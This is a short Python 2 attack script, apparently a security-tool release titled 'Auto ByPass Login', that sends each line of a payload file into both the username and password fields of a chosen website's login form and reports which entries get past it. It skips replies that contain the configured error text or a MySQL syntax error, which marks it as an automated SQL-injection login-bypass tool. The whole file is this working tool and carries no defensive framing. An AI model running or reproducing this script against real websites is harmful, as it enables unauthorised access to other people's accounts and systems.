#Auto ByPass Login ver 1.0
#Tools By Esecurity.ir
import sys,os,json
try:
	import requests
except:
	print 'No module requests Please Install!'
	sys.exit()
	
try:
	from colorama import init
	init()
	from colorama import Fore, Back, Style
except:
	print 'No module colorama Please Install!'
	sys.exit()	
	
	
headers_data = {'user-agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0'}
login_dict = "bypass_login.txt"


def useage():
	print "#"*51
	print "# Auto ByPass Login ver 1.0   \t\t\t  #"
	print "# Tools By Esecurity.ir  \t\t\t  #"
	print "# python auto_bypass_login.py config.json   \t  #"
	print "#"*51
	
def banner():
	print "#"*51
	print "# Auto ByPass Login ver 1.0   \t\t\t  #"
	print "# Tools By Esecurity.ir  \t\t\t  #"
	print "#"*51	
	
	
def main():
	if len(sys.argv) == 2:
		run(sys.argv[1])
	else:
		useage()
		

	
	
def run(config_file):
	if not os.path.exists(config_file):
		print config_file + " config file not found!"
		sys.exit()
		
	config_file = open(config_file,'r')
	config_data = json.loads(config_file.read())
	if  not config_data.has_key('action'):
		print "key action not found!"
		sys.exit()
	elif  not config_data.has_key('user_field'):
		print "key user_field not found!"
		sys.exit()		
	elif  not config_data.has_key('pass_field'):
		print "key pass_field not found!"
		sys.exit()
	elif  not config_data.has_key('other_data'):
		print "key other_data not found!"
		sys.exit()
	elif  not config_data.has_key('msg_error'):
		print "key msg_error not found!"
		sys.exit()	
	else:
		execute(config_data)
		

def execute(config_data):
	if not os.path.exists(login_dict):
		print login_dict + " file not found!"
		sys.exit()
	banner()
	file = open(login_dict,'r')
	for line in file.read().split("\n"):
		data = {config_data['user_field']:line,config_data['pass_field']:line}
		data.update(config_data['other_data'])
		try:
			r = requests.post(config_data['action'],data=data,headers=headers_data)
			if r.status_code == 200:
				if r.content.strip() != "" and str(config_data['msg_error']) not in r.content and "You have an error in your SQL syntax" not in r.content :
					print(Fore.GREEN + "Login OK => " +  line )
			else:
				print 'Page Not Found! :( '
		except Exception as e:
			print str(e) + ' Error! :( '
	
try:
	main()
except KeyboardInterrupt:
	sys.exit()
except Exception as e:
	print str(e) + ' Error! :( '
	sys.exit()	